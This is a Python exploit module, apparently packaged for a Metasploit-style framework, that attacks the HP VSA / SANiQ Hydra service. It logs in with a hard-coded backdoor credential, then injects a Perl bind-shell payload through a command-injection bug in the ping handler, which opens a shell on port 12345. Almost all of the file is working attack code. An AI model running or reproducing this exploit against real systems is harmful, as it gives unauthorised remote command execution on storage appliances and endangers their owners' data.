def about():
	print '''!/usr/bin/python
HP VSA / SANiQ Hydra client
Nicolas Gregoire <nicolas.gregoire@agarri.fr>
Version: 0.5
	'''

def auto_help(name,rank,description):
	stbl = "  " + name + " "*(12-len(name)+4) + rank + " "*(8-len(rank)+4) + description
	return stbl

def auto_targ(targetlist):
	print "Vulnrable Applications (hpHydra)"
	print
	print "  ID       Device"
	print "  --       ------"
	for _ in targetlist:
		print "  "+_+" "*(8-len(_))+targetlist[_]
	print

try:
	if desc == "get-id":
		print auto_help("hpHydra","Normal","HP Exploit")
except:
	pass

def auto_info(name="",module="",plat="",priv="",lic="",rank="Normal",release="N/A",by="N/A"):
	print
	print "Publisher Information for hpHydra"
	print
	print "       Name:","hpHydra"
	print "     Module:",module
	print "   Platform:","Python"
	print " Privileged:","No"
	print "    License:","None"
	print "       Rank:",rank
	print "  Disclosed:",release

def auto_opt(name,cset,req,description):
	stbl = "  " + name + " "*(9-len(name)) + cset + " "*(12-len(cset)+2) + req + " "*(8-len(req)+2) + description
	print stbl

class hpHydra(object):
	def start(self):
		#!/usr/bin/python
		
		''' ==================================
		          Pseudo documentation 
		================================== '''
		
		# HP VSA / SANiQ Hydra client
		# Nicolas Gregoire <nicolas.gregoire@agarri.fr>
		# v0.5
		
		''' ==================================
		          Target information
		================================== '''
		
		HOST = raw_input("Remote Host: ")
		PORT = 13838
		
		''' ==================================
		             Imports 
		================================== '''
		
		import getopt
		import re
		import sys
		import binascii
		import struct
		import socket
		import os
		
		socket.setdefaulttimeout(TIMEOUT)
		
		''' ==================================
		        Define functions
		================================== '''
		
		# Some nice formatting
		def zprint(str):
			print '[=] ' + str
		
		# Define packets
		def send_Exec():
			zprint('Send Exec')
			
			# RESTRICTIONS
			# You can't use "/" in the payload
			# No Netcat/Ruby/PHP, but telnet/bash/perl are available
		
			# METASPLOIT PAYLOAD
			cmd = "perl -MIO -e '$p=fork();exit,if$p;$c=new IO::Socket::INET(LocalPort,12345,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"
		
			# COMMAND INJECTION BUG
			data = 'get:/lhn/public/network/ping/127.0.0.1/foobar;' + cmd + '/'
		
			# EXPLOIT
			zprint('Now connect to port 12345 of machine ' + str(HOST))
			send_packet(data)
		
		def send_Login():
			zprint('Send Login')
			data = 'login:/global$agent/L0CAlu53R/Version "8.5.0"' # Backdoor
			send_packet(data)
		
		# Define the sending function
		def send_packet(message):
		
			# Add header
			ukn1 = '\x00\x00\x00\x00\x00\x00\x00\x01'
			ukn2 = '\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x00\x00\x00\x14\xff\xff\xff\xff'
			message = message + '\x00'
			data = ukn1 + struct.pack('!I', len(message)) + ukn2 + message
		
			# Send & receive
			s.send(data)
			data = s.recv(1024)
			zprint('Received : [' + data + ']')
		
		''' ==================================
		           Main code
		================================== '''
		
		# Print bannner
		zprint('HP Hydra client')
		zprint('Attacking host ' + HOST + ' on port ' + str(PORT))
		
		# Connect
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(TIMEOUT)
		s.connect((HOST, PORT))
		# Attack
		send_Login()
		send_Exec()
		# Deconnect
		s.close()
		# Exit
		zprint('Exit')

try:
	TIMEOUT
except:
	TIMEOUT = 5

def show_opt():
	print
	print "Module Options (hpHydra)"
	print
	print "  Name     Current Setting  Required  Description"
	print "  ----     ---------------  --------  -----------"
	try:
		auto_opt("TIMEOUT", str(TIMEOUT),"no", "Timeout Time")
	except:
		auto_opt("TIMEOUT","   ","no", "Timelout Time")
	print 

try:
	if desc == "get-opt":
		show_opt()
except:
	pass

try:
	if desc == "get-info":
		auto_info(module="exploit",plat="Python 2.7",priv="No",lic="N/A")
		show_opt()
		targets = {"1":"HP VSA SANiQ Hydra"}
		auto_targ(targets)
		about()
		print
except Exception as e:
	pass

try:
	if desc == "proc":
		try:
			program = hpHydra()
			program.start()
		except Exception as e:
			print e
			print "[-] Failed\n"
			time.sleep(0.3)
			show_opt()
except:
	pass
